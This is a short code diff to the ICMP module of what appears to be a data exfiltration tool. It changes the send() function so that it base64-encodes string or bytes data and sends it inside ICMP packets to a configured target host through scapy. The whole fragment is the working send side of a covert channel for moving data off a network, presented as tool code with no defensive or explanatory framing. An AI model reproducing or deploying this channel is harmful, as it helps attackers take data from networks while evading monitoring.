@@ -8,11 +8,13 @@ app_exfiltrate = None
 
 
 def send(data):
-    data = base64.b64encode(data)
+    payload = base64.b64encode(
+        data.encode('utf-8') if isinstance(data, str) else data)
     app_exfiltrate.log_message(
-        'info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
+        'info', "[icmp] Sending {} bytes with ICMP packet".format(len(payload)))
     scapy.sendp(scapy.Ether() /
-                scapy.IP(dst=config['target']) / scapy.ICMP() / data, verbose=0)
+                scapy.IP(dst=config['target']) / scapy.ICMP() / payload,
+                verbose=0)
 
 
 def listen():
